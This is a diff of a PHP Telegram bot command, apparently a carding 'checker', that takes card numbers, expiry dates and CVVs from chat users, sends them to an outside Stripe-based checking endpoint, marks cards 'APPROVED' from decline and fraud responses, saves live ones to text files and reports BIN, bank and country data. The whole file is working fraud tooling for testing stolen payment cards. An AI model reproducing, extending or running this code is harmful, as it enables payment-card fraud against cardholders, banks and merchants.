@@ -1,97 +1,92 @@
 <?php
-if ((strpos($message, "/au") === 0)||(strpos($message, "!au") === 0)||(strpos($message, ".au") === 0)){
-$pro = file_get_contents('pre.txt');
-$pros = explode("\n", $pro);
-if (in_array($chatId, $pros)) {
-sendaction($chatId, typing);
-$message = substr($message, 4);
-$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
-$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
-$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
-$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
-    $mes2 = '12';
-  $ano2 = '24';
-  $cvv2 = '000';
-  if (empty($cvv)) {
-      $lista = "$cc|$mes2|$ano2|$cvv2";
-    $listaxz = "$cc";
-  } 
-  else {
-    $lista = "$cc|$mes|$ano|$cvv";
-     $listaxz = "$cc|$mes|$ano|$cvv";
-  }
-     
-     $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] CC: ".$listaxz."%0A[ϟ] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
-  
-    $sent = json_decode(file_get_contents($sendmes) ,1);
-      $mes_id = $sent['result']['message_id'];
-  
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'http://20.212.107.64/sendnudez/Stripe-8/chk.php?lista='.$lista.'');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$fimaa = curl_exec($ch);
+if ((strpos($message, "/au") === 0) || (strpos($message, "!au") === 0) || (strpos($message, ".au") === 0)) {
+	$pro = file_get_contents('pre.txt');
+	$pros = explode("\n", $pro);
+	if (in_array($chatId, $pros)) {
+		sendaction($chatId, typing);
+		$message = substr($message, 4);
+		$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
+		$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
+		$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
+		$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
+		$mes2 = '12';
+		$ano2 = '24';
+		$cvv2 = '000';
+		if (empty($cvv)) {
+			$lista = "$cc|$mes2|$ano2|$cvv2";
+			$listaxz = "$cc";
+		} else {
+			$lista = "$cc|$mes|$ano|$cvv";
+			$listaxz = "$cc|$mes|$ano|$cvv";
+		}
 
-$msg = trim(strip_tags(getStr($fimaa,' <br>Result:','</span><br>')));
+		$sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[✦] CC: ".$listaxz."%0A[✦] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
 
-if (strpos($fimaa, "INSUFFICIENT FUNDS") || strpos($fimaa, "CVV LIVE")) {
-  $pass = 'APPROVED ✅';
-      file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
-}
-  if (strpos($fimaa, "TRANSACTION NOT ALLOWED") || strpos($fimaa, "3DS2")) {
-  $pass = 'APPROVED ✅';
-        file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
-}
-if (strpos($fimaa, "Security code is incorrect") || strpos($fimaa, "Security code is incorrect")) {
-  $pass = 'APPROVED ✅';
-      file_put_contents('./tmp/ccn.txt', $lista . PHP_EOL, FILE_APPEND);
-}
+		$sent = json_decode(file_get_contents($sendmes), 1);
+		$mes_id = $sent['result']['message_id'];
 
-  if (strpos($fimaa, "CARD AUTHORIZED ✅") || strpos($fimaa, "CHARGED CC")) {
-  $pass = 'APPROVED ✅';
-    file_put_contents('./tmp/auth.txt', $lista . PHP_EOL, FILE_APPEND);
-}
-  if (strpos($fimaa, "GENERIC DECLINED") || strpos($fimaa, "This transaction has been declined.")) {
-  $pass = 'DECLINED ❌';
-}
-  
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, 'https://response.artsvn.repl.co/chk.php?lista='.$lista.'');
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		$fimaa = curl_exec($ch);
 
-  $bin = substr("$cc", 0, 6);
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: lookup.binlist.net',
-'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
-$fim = curl_exec($ch);
-$bank = GetStr($fim, '"bank":{"name":"', '"');
-$name = strtoupper(GetStr($fim, '"name":"', '"'));
-$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
-$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
-$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
-$emoji = GetStr($fim, '"emoji":"', '"');
-$type =strtoupper(GetStr($fim, '"type":"', '"'));
-if(strpos($fim, '"type":"Credit"') !== false){
-};
-  $bug = file_get_contents('bugdb.txt');
-$bugs = explode("\n", $bug);
-if (in_array($bin, $bugs)) {
-$isbug = $t;
-}
-else {
-$isbug = $f;
-}
-  $binrs = "<b>━━━━━━━━━━━━━%0A[ϟ] BIN: $bin%0A[ϟ] COUNTRY: $country $emoji%0A[ϟ] BRAND: $brand%0A[ϟ] LEVEL: $scheme%0A[ϟ] TYPE: $type%0A[ϟ] BANK: $bank</b>";
-$time_end = microtime(true);
-  $execution_time = ($time_end - $time_start);
-  editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE AUTH%0A[ϟ] CC: <code>$listaxz</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
-}
+		$msg = trim(strip_tags(getStr($fimaa, ' <br>Result:', '</span><br>')));
 
-else {
-  sendMessage($chatId, "<b>You are not authorized to use this command in here.You can use me in @heckerdrops chat or get authorization.</b>", $message_id);
-}
+		if (strpos($fimaa, "INSUFFICIENT FUNDS") || strpos($fimaa, "CVV LIVE")) {
+			$pass = 'APPROVED ✅';
+			file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
+		}
+		if (strpos($fimaa, "TRANSACTION NOT ALLOWED") || strpos($fimaa, "3DS2")) {
+			$pass = 'APPROVED ✅';
+			file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
+		}
+		if (strpos($fimaa, "Security code is incorrect") || strpos($fimaa, "Security code is incorrect")) {
+			$pass = 'APPROVED ✅';
+			file_put_contents('./tmp/ccn.txt', $lista . PHP_EOL, FILE_APPEND);
+		}
+
+		if (strpos($fimaa, "CARD AUTHORIZED ✅") || strpos($fimaa, "CHARGED CC")) {
+			$pass = 'APPROVED ✅';
+			file_put_contents('./tmp/auth.txt', $lista . PHP_EOL, FILE_APPEND);
+		}
+		if (strpos($fimaa, "GENERIC DECLINED") || strpos($fimaa, "This transaction has been declined.")) {
+			$pass = 'DECLINED ❌';
+		}
+
+
+		$bin = substr("$cc", 0, 6);
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
+		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+			'Host: lookup.binlist.net',
+			'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
+		$fim = curl_exec($ch);
+		$bank = GetStr($fim, '"bank":{"name":"', '"');
+		$name = strtoupper(GetStr($fim, '"name":"', '"'));
+		$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
+		$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
+		$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
+		$emoji = GetStr($fim, '"emoji":"', '"');
+		$type = strtoupper(GetStr($fim, '"type":"', '"'));
+		if (strpos($fim, '"type":"Credit"') !== false) {};
+		$bug = file_get_contents('bugdb.txt');
+		$bugs = explode("\n", $bug);
+		if (in_array($bin, $bugs)) {
+			$isbug = $t;
+		} else {
+			$isbug = $f;
+		}
+		$binrs = "<b>━━━━━━━━━━━━━%0A[✦] BIN: $bin%0A[✦] COUNTRY: $country $emoji%0A[✦] BRAND: $brand%0A[✦] LEVEL: $scheme%0A[✦] TYPE: $type%0A[✦] BANK: $bank</b>";
+		$time_end = microtime(true);
+		$execution_time = ($time_end - $time_start);
+		editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[✦] GATE: STRIPE AUTH%0A[✦] CC: <code>$listaxz</code>%0A[✦] STATUS: $pass%0A[✦] RESPONSE: $msg%0A[✦] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[✦] TIME TAKEN: $execution_time's%0A[✦] Checked By: @$username%0A[✦] UserID: $userId%0A[✦] Premium Activated: $stat%0A</b>", $mes_id);
+	} else {
+		sendMessage($chatId, "<b>You are not authorized to use this command in here. You can use me in @arterxskchats chat or get authorization.</b>", $message_id);
+	}
 }
